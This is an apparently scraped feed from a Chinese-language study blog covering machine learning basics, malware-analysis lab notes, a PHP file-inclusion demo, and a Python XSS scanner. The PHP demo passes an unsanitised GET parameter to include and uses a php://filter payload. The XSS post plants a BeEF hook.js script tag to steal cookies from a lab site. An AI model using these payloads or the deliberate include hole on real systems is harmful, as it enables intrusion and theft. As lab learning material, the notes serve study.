        <content type="html"><![CDATA[<p><ahref="https://www.bilibili.com/video/BV1Zt4y1H78P?p=7&amp;vd_source=03c4adad8a71f5349bd0c6db2d174203">视频链接</a></p><p><ahref="https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes">github笔记</a></p><h3 id="监督学习">监督学习</h3><ul><li>本质：学习从输入x到输入y的映射（从正确答案中学习，数据x和标签y都是已知的</li><li>回归与分类<ul><li>回归：预测正确答案（可能有无数种结果）</li><li>分类：类别数固定</li></ul></li></ul><h3 id="非监督学习">非监督学习</h3><ul><li><p>事先不知道输出</p></li><li><p>clustering:聚类算法</p></li><li><p>例子</p><ul><li>广告分群组</li><li>根据DNA分类型</li></ul></li><li><p>python 环境，jupyter notebook的安装</p><ul><li><figure><img src="https://s2.loli.net/2022/12/02/lArOzwFvVHTjxbB.png"alt="image-20221202175501899" /><figcaption aria-hidden="true">image-20221202175501899</figcaption></figure></li></ul></li></ul><h3 id="线性回归模型">线性回归模型</h3><ul><li><p>cost function（平方误差成本函数）</p><ul><li><p>找到最佳参数</p></li><li><p><span class="math display">\[J_(w,b）的简化：b=0\]</span></p></li><li><p><span class="math display">\[计算J_(w)的值\]</span></p></li><li><p>m为训练集示例数量</p></li></ul><hr /><p>​ <img src="https://s2.loli.net/2023/02/03/4A2zs8IO5Zw1RBu.png"alt="image-20230203163827778" /></p><ul><li>J<sub>(w,b)</sub></li><li>将3D图转化为等高线图</li></ul></li><li><p>梯度下降</p><ul><li><p>最小化函数</p></li><li><p>此处，我们用来最小化<strong>成本函数</strong></p></li><li><p>实现梯度下降</p><ul><li><p><span class="math display">\[w = w -\alpha\frac{\partial}{\partial w}J_{(w,b)}\\b = b -\alpha\frac{\partial}{\partial b}J_{(w,b)}\]</span></p></li><li><p>同步更新w和b</p></li><li></li></ul><figure><img src="https://s2.loli.net/2023/02/03/nUcBi1A9gwzH7Pf.png"alt="image-20230203180326171" /><figcaption aria-hidden="true">image-20230203180326171</figcaption></figure><ul><li></li><li><p><span class="math display">\[\alpha: 学习速率，控制步伐\]</span></p></li><li></li></ul><figure><img src="https://s2.loli.net/2023/02/03/8fV9ZU67mIQXKkC.png"alt="image-20230203181723073" /><figcaption aria-hidden="true">image-20230203181723073</figcaption></figure><ul><li></li><li><p><span class="math display">\[\alpha: 过大，过小时的讨论\\\]</span></p><ul><li>当J在局部最小值时，犹豫导数绝对值越来越小，因此下降的步伐也会越来越小</li></ul></li></ul></li></ul></li></ul><h3 id="线性回归模型中的梯度下降">线性回归模型中的梯度下降</h3><ul><li><p><span class="math display">\[线性回归模型：f_{w,b}(x) = wx +b\\成本函数：J_{w,b} = \frac1{2m}\begin{matrix} \sum_{i=1}^m(f_{(w,b)}(x^{(i)})-y^{(i)})^2 \end{matrix}\\梯度下降算法：w = w -\alpha\frac{\partial}{\partial w}J_{(w,b)}，b = b -\alpha\frac{\partial}{\partial b}J_{(w,b)}\]</span></p></li><li><figure><img src="https://s2.loli.net/2023/02/03/a6iEpuZJrqncSGI.png"alt="image-20230203190240351" /><figcaption aria-hidden="true">image-20230203190240351</figcaption></figure></li><li><p>batch gradient descent</p><ul><li>all the training example</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Machine Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PMA-lab-3</title>
      <link href="/2022/11/04/pma04-lab3/"/>
      <url>/2022/11/04/pma04-lab3/</url>
      
        <content type="html"><![CDATA[<h3 id="section">3-1</h3><figure><imgsrc="C:/Users/liu%20haihua/AppData/Roaming/Typora/typora-user-images/image-20221104151459837.png"alt="image-20221104151459837" /><figcaption aria-hidden="true">image-20221104151459837</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary exploition </tag>
            
            <tag> Reverse engineering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PMA-lab-1</title>
      <link href="/2022/10/12/pma03-lab1/"/>
      <url>/2022/10/12/pma03-lab1/</url>
      
        <content type="html"><![CDATA[<h3 id="准备">准备</h3><p><ahref="https://blog.csdn.net/m0_37442062/article/details/116404462?spm=1001.2014.3001.5502">教程1</a></p><p><ahref="https://blog.csdn.net/weixin_39561364/article/details/108471196?spm=1001.2014.3001.5502">教程2</a></p><p><ahref="https://github.com/theRealFr13nd/analysisTools">工具集合</a></p><p><ahref="https://github.com/mikesiko/PracticalMalwareAnalysis-Labs">PracticalMalwareAnalysis-Labs</a></p><h3 id="lab1-1">lab1-1</h3><ul><li><p><a href="https://www.virustotal.com/">virustotal</a></p></li><li><p><strong>DETAILS</strong>栏</p></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210112153607.png"alt="image-20221011215306253" /><figcaption aria-hidden="true">image-20221011215306253</figcaption></figure><ul><li>PEID 检测未加壳或混淆</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210112206531.png"alt="image-20221011220643453" /><figcaption aria-hidden="true">image-20221011220643453</figcaption></figure><ul><li>输入表查看器<ul><li>msvcrt.dll: 通常是被每一个可执行文件包含的</li><li></li></ul></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210112221531.png"alt="image-20221011222110458" /><figcaption aria-hidden="true">image-20221011222110458</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210112221910.png"alt="image-20221011222144841" /><figcaption aria-hidden="true">image-20221011222144841</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210112223664.png"alt="image-20221011222318569" /><figcaption aria-hidden="true">image-20221011222318569</figcaption></figure><ul><li><p>strings工具</p><ul><li><p><ahref="https://learn.microsoft.com/zh-cn/sysinternals/downloads/strings">安装</a></p></li><li><p>添加到环境变量</p></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210112258031.png"alt="image-20221011225825954" /><figcaption aria-hidden="true">image-20221011225825954</figcaption></figure><ul><li>Lab01-01.exe</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210112305260.png"alt="image-20221011230539189" /><figcaption aria-hidden="true">image-20221011230539189</figcaption></figure><ul><li>Lab01-01.dll</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210112306116.png"alt="image-20221011230649054" /><figcaption aria-hidden="true">image-20221011230649054</figcaption></figure></li></ul><h3 id="lab1-2">lab1-2</h3><ul><li></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210120104597.png"alt="image-20221012010417514" /><figcaption aria-hidden="true">image-20221012010417514</figcaption></figure><ul><li><div class="sourceCode" id="cb1"><preclass="sourceCode cmd"><code class="sourceCode dosbat"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>  upx <span class="at">-d</span> 文件名.exe</span></code></pre></div><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210120114178.png"alt="image-20221012011419089" /><figcaption aria-hidden="true">image-20221012011419089</figcaption></figure></li><li>脱壳后</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210120116223.png"alt="image-20221012011650159" /><figcaption aria-hidden="true">image-20221012011650159</figcaption></figure><ul><li>strings</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210120126052.png"alt="image-20221012012642974" /><figcaption aria-hidden="true">image-20221012012642974</figcaption></figure><h3 id="lab1-3">Lab1-3</h3><ul><li>节没有名字</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210120133004.png"alt="image-20221012013312945" /><figcaption aria-hidden="true">image-20221012013312945</figcaption></figure><ul><li>time date stamp</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210120136050.png"alt="image-20221012013559982" /><figcaption aria-hidden="true">image-20221012013559982</figcaption></figure><ul><li>dependency walker</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210120147013.png"alt="image-20221012014728899" /><figcaption aria-hidden="true">image-20221012014728899</figcaption></figure><h3 id="lab1-4">lab1-4</h3><ul><li>resource hacker</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210130130442.png"alt="image-20221013013035309" /><figcaption aria-hidden="true">image-20221013013035309</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210130131856.png"alt="image-20221013013120789" /><figcaption aria-hidden="true">image-20221013013120789</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210130131911.png"alt="image-20221013013158846" /><figcaption aria-hidden="true">image-20221013013158846</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模型评估与选择</title>
      <link href="/2022/10/08/ml02/"/>
      <url>/2022/10/08/ml02/</url>
      
        <content type="html"><![CDATA[<ul><li>训练误差和泛化误差</li><li>过拟合和欠拟合</li><li>留出法</li><li>交叉验证法</li><li>自助法</li><li>参数配置</li><li>性能度量</li><li>假设检验</li><li>比较检验</li><li>偏差与方差</li></ul>]]></content>
      
      
      <categories>
          
          <category> Machine Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>动态分析</title>
      <link href="/2022/10/08/pma02-dong-tai-fen-xi/"/>
      <url>/2022/10/08/pma02-dong-tai-fen-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="在虚拟机中分析恶意代码">在虚拟机中分析恶意代码</h3><ul><li>Host-only模式:在宿主操作系统和客户操作系统之间创建一个<strong>隔离</strong>的私有局域网</li><li>创建多个虚拟机<ul><li>一个虚拟机运行恶意代码</li><li>第二个虚拟机则提供一些必要的网络服务</li><li>改为host-only会改变IP地址</li></ul></li><li>快照<ul><li>一些恶意代码会检测它是否在虚拟机上运行</li></ul></li><li>记录/重放：重复计算机运行轨迹</li></ul><h3 id="环境过程">环境过程</h3><ul><li><ahref="https://blog.csdn.net/AcSuccess/article/details/103440800">参考过程</a></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210112031441.png"alt="image-20221011203115281" /><figcaption aria-hidden="true">image-20221011203115281</figcaption></figure><h3 id="动态分析">动态分析</h3><ul><li>在静态分析之后进行</li><li>沙箱技术<ul><li>不能带有命令行选项</li><li>不能记录所有事件</li><li>恶意代码需要特定的注册表项和文件才会执行</li></ul></li><li>如何运行DLL文件<ul><li>DLLMAIN:DLL函数入口</li><li>DLL形态的恶意代码也可能需要被安装成一个服务</li></ul></li><li>进程监视器<ul><li>监控所有能捕获的系统调用</li></ul></li><li>进程浏览器<ul><li>使用依赖遍历器</li><li>分析恶意文档</li><li>Regshot</li></ul></li><li>Netcat</li></ul>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary exploition </tag>
            
            <tag> Reverse engineering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss文件包含漏洞原理</title>
      <link href="/2022/10/03/xss-wen-jian-bao-han-lou-dong-yuan-li/"/>
      <url>/2022/10/03/xss-wen-jian-bao-han-lou-dong-yuan-li/</url>
      
        <content type="html"><![CDATA[<h3 id="本地文件包含">本地文件包含</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fileName'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token variable">$fileName</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"欢迎来到php的世界"</span><span class="token punctuation">;</span></span></code></pre><h3 id="远程文件包含">远程文件包含</h3><ul><li>/opt/lampp/etc/php.ini,更改配置</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210021703113.png"alt="image-20221002170334041" /><figcaption aria-hidden="true">image-20221002170334041</figcaption></figure><ul><li>在远程主机还是本地主机执行远程文件</li></ul><h3 id="php伪协议利用">php伪协议利用</h3><pre class="language-uri" data-language="uri"><code class="language-uri"><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">192.168.104.130</span></span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host">security</span></span><span class="token path"><span class="token path-separator">/</span>fileInc</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">fileName</span>=<span class="token value">php://filter</span></span></span> </code></pre><ul><li>php://filter</li><li>php://input</li><li>phar://</li></ul><h3 id="文件包含漏洞原理利用">文件包含漏洞原理利用</h3><ul><li>access_log</li><li>web日志</li><li>登录日志</li><li>包含上传文件：图片马</li></ul>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Machine-Learning00</title>
      <link href="/2022/10/01/ml01/"/>
      <url>/2022/10/01/ml01/</url>
      
        <content type="html"><![CDATA[<h3 id="绪论">绪论</h3><h4 id="概念术语">概念术语</h4><ul><li>模型</li><li>数据集</li><li>样本空间</li><li>特征向量</li><li>训练</li><li>分类和回归</li><li>聚类</li><li>监督学习和无监督学习</li><li>泛化</li></ul><h4 id="假设空间">假设空间</h4><ul><li>归纳和演绎</li><li>泛化和特化</li><li>版本空间</li><li>归纳偏好</li><li>奥卡姆剃刀</li><li>NFL定理：针对具体问题，谈论算法优劣</li></ul>]]></content>
      
      
      <categories>
          
          <category> Machine Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>静态分析</title>
      <link href="/2022/10/01/pma01-jing-tai-fen-xi/"/>
      <url>/2022/10/01/pma01-jing-tai-fen-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是恶意代码分析">什么是恶意代码分析</h3><ul><li><p>也称恶意软件</p></li><li><p>对用户、计算机、网络造成破坏的软件，是一种解剖恶意代码的艺术</p></li><li><p>了解恶意代码是如何工作、如何识别以及如何战胜和消除它</p><ul><li>计算机病毒</li><li>木马</li><li>蠕虫</li><li>内核套件</li><li>勒索软件</li><li>间谍软件</li></ul></li><li><p>主要专注于windows系统的恶意代码分析，也会研究js脚本的恶意代码</p></li><li><p>牢记这些<strong>原则：</strong></p><blockquote><ul><li>不要过多纠结于细节，关注关键的部分</li><li>工具应当有针对性的使用，陷入困境时，换一种工具/方法进行</li><li></li></ul></blockquote></li><li><p>将会学习如下的知识、工具、技术和研究方法</p></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209091459035.png"alt="00000" /><figcaption aria-hidden="true">00000</figcaption></figure><ul><li>并在学习过程进行实践</li></ul><h3 id="第0章">第0章</h3><h4 id="分析目标">分析目标</h4><ul><li>尽管恶意代码以不同的形式出现，但是分析的方法是通用的</li><li>而选择哪项技术，取决于你的目标</li><li>通常的目标：确定一个可疑的二进制目标程序可以做什么、如何在网络中检测出来以及如何消除损害</li><li>编写检测特征码<ul><li>基于主机的特征码</li><li>网络特征码</li></ul></li><li>分析malware工作流程</li></ul><h4 id="分析技术">分析技术</h4><ul><li>静态分析：检查可执行文件和具体指令</li><li>动态分析：运行恶意代码</li><li>静态分析高级技术：逆向工程、反汇编、代码结构、windows 操作系统</li><li>动态分析高级技术：调试器检查内部状态</li></ul><h3 id="恶意代码分类">恶意代码分类</h3><ul><li><p>后门</p></li><li><p>僵尸网络</p></li><li><p>下载器</p></li><li><p>间谍软件</p></li><li><p>间谍软件</p></li><li><p>启动器</p></li><li><p>内核套件</p></li><li><p>勒索软件</p></li><li><p>发送垃圾的恶意代码</p></li><li><p>蠕虫或计算机病毒</p></li><li><p>其他分类：大众恶意代码和针对性恶意代码</p></li></ul><h4 id="恶意代码分析通用规则">恶意代码分析通用规则</h4><ul><li>没用通吃的方法，自由不断尝试各种方法</li></ul><h3 id="静态分析基础技术">静态分析基础技术</h3><ul><li><p>分析程序指令和结构</p></li><li><p>反病毒引擎扫描</p><ul><li>依靠一个恶意代码可识别片段的特征数据库（病毒文件特征库），以及基于行为与模式匹配的分析来识别可疑文件（启发式检测）</li></ul></li><li><p>哈希值：唯一标识恶意代码</p><ul><li>MD5</li><li>SHA-1</li><li>哈希值可以分享</li></ul></li><li><p>查找字符串</p><ul><li>ASCII:1字节</li><li>Unicode：2字节</li><li>string 程序检测字符串</li></ul></li><li><p>加壳与混淆恶意代码：让文件更加难以检测和分析</p><ul><li>混淆：隐藏执行过程</li><li>加壳：恶意程序被压缩，难以分析</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209300053906.png"alt="image-20220930005310820" /><figcaption aria-hidden="true">image-20220930005310820</figcaption></figure></li></ul><p>​</p><ul><li>PEiD检测加壳</li><li>PEiD也可能会受到安全漏洞的威胁</li><li>upx</li><li>PE文件（可移植执行文件）格式:是windows可执行文件、对象代码、DLL所使用的标准格式，实际是一种数据结构</li><li>PE文件头<ul><li>分节<ul><li>.text</li><li>.rdata</li><li>.data</li></ul></li><li>PEview</li><li>代码信息</li><li>应用程序类型</li><li>所需的库函数与空间要求</li></ul></li><li>链接库和函数</li><li>静态链接</li><li>运行时链接</li><li>动态链接：恶意代码中常见</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210071221523.png"alt="image-20221007122133374" /><figcaption aria-hidden="true">image-20221007122133374</figcaption></figure><ul><li>dependency walker</li></ul><h3 id="lab-1">lab-1</h3>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary exploition </tag>
            
            <tag> Reverse engineering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ppt制作教程速成版</title>
      <link href="/2022/09/27/ppt-zhi-zuo/"/>
      <url>/2022/09/27/ppt-zhi-zuo/</url>
      
        <content type="html"><![CDATA[<h3 id="构成">构成</h3><ul><li>文字</li><li>图片</li><li>动画</li></ul><h3 id="参考线">参考线</h3><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209262244701.png"alt="image-20220926224407595" /><figcaption aria-hidden="true">image-20220926224407595</figcaption></figure><h3 id="图片">图片</h3><ul><li>图片层叠</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209262252888.png"alt="image-20220926225212614" /><figcaption aria-hidden="true">image-20220926225212614</figcaption></figure><h3 id="动画">动画</h3><ul><li><p>动画窗格</p></li><li><p>动作路径</p></li><li><p>幻灯片切换</p></li></ul><h3 id="成组">成组</h3><h3 id="隐藏">隐藏</h3><ul><li>插入一个框--&gt;设置形状格式--&gt;颜色--&gt;取色器</li></ul><h3 id="半透明蒙板">半透明蒙板</h3>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ppt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python开发xss扫描器</title>
      <link href="/2022/09/26/python-kai-fa-xss-sao-miao-qi/"/>
      <url>/2022/09/26/python-kai-fa-xss-sao-miao-qi/</url>
      
        <content type="html"><![CDATA[<h3 id="思路">思路</h3><ol type="1"><li>发送请求（url,参数，payload）</li><li>准备一个payload字典</li><li>不同类型的payload，使用不同的请求方式，检查payload的方式也不一样</li></ol><h3 id="代码">代码</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str_html</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> source<span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token string">'&amp;#x'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">';'</span>    <span class="token keyword">return</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check_resp</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> response<span class="token punctuation">.</span>find<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    prefix <span class="token operator">=</span> response<span class="token punctuation">[</span>index<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span>index<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'Normal'</span> <span class="token keyword">and</span> prefix <span class="token operator">!=</span> <span class="token string">'='</span> <span class="token keyword">and</span> index <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">elif</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'Prop'</span> <span class="token keyword">and</span> prefix <span class="token operator">==</span> <span class="token string">'='</span> <span class="token keyword">and</span> index <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">elif</span> index <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">xss_scanFun</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> location<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    param <span class="token operator">=</span> location<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'../dict/xss.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        payload_list <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> payload <span class="token keyword">in</span> payload_list<span class="token punctuation">:</span>        <span class="token builtin">type</span> <span class="token operator">=</span> payload<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># strip()默认删除头尾空白符</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'Refer'</span> <span class="token keyword">or</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'User-Agent'</span> <span class="token keyword">or</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'Cookie'</span><span class="token punctuation">:</span>            header <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token builtin">type</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span>            resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span>param<span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> check_resp<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"此处存在xss漏洞：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    xss_scanFun<span class="token punctuation">(</span><span class="token string">'http://192.168.104.130/xss-labs/level5.php?keyword=test'</span><span class="token punctuation">)</span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209260043246.png"alt="image-20220926004331142" /><figcaption aria-hidden="true">image-20220926004331142</figcaption></figure><h3 id="xss-工具">xss 工具</h3><ul><li>xsstrike</li></ul><p><a href="https://github.com/s0md3v/XSStrike">开源工具</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python3 xsstrike.py <span class="token parameter variable">-u</span> http://192.168.104.130/xss-labs/level2.php?keyword<span class="token operator">=</span>test</code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209261649281.png"alt="image-20220926164924015" /><figcaption aria-hidden="true">image-20220926164924015</figcaption></figure><ul><li>burpsuite</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209261723912.png"alt="image-20220926172354800" /><figcaption aria-hidden="true">image-20220926172354800</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209261726812.png"alt="image-20220926172632680" /><figcaption aria-hidden="true">image-20220926172632680</figcaption></figure><ul><li><p>BeefXss</p><ul><li>kali上安装beef-xss</li><li>登录ui界面</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210021603235.png"alt="启动beef-xss" /><figcaption aria-hidden="true">启动beef-xss</figcaption></figure><ul><li>发表文章（植入：<code>&lt;script src="http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;</code>）</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210021614715.png"alt="image-20221002161409606" /><figcaption aria-hidden="true">image-20221002161409606</figcaption></figure><ul><li>执行命令（get cookie/redirect/pretty theft）</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202210021614933.png"alt="image-20221002161431834" /><figcaption aria-hidden="true">image-20221002161431834</figcaption></figure><ul><li></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Academic Progress</title>
      <link href="/2022/09/05/academic-progress/"/>
      <url>/2022/09/05/academic-progress/</url>
      
        <content type="html"><![CDATA[<h3 id="论文合集置顶">论文合集（置顶）</h3><p>描述：我看过的全部论文</p><p><ahref="https://ieeexplore.ieee.org/search/searchresult.jsp?queryText=malware%20malicious&amp;highlight=true&amp;returnFacets=ALL&amp;returnType=SEARCH&amp;matchPubs=true&amp;refinementName=Publication%20Title&amp;refinements=PublicationTitle:IEEE%20Transactions%20on%20Information%20Forensics%20and%20Security&amp;refinements=PublicationTitle:IEEE%20Transactions%20on%20Dependable%20and%20Secure%20Computing">在TIFS和TDSC上的恶意代码检测相关文章检索</a></p><p><ahref="https://ieeexplore.ieee.org/search/searchresult.jsp?queryText=adversarial%20example&amp;highlight=true&amp;returnType=SEARCH&amp;matchPubs=true&amp;refinementName=Publication%20Title&amp;pageNumber=1&amp;refinements=PublicationTitle:IEEE%20Transactions%20on%20Information%20Forensics%20and%20Security&amp;refinements=PublicationTitle:IEEE%20Transactions%20on%20Dependable%20and%20Secure%20Computing&amp;returnFacets=ALL">在TIFS和TDSC上的对抗样本的相关文章检索</a></p><p><ahref="https://zhuanlan.zhihu.com/p/585456510">对抗鲁棒性学习资料汇总</a></p><hr /><ol type="1"><li><a href="https://ieeexplore.ieee.org/document/9186721">Can We TrustYour Explanations? Sanity Checks for Interpreters in Android 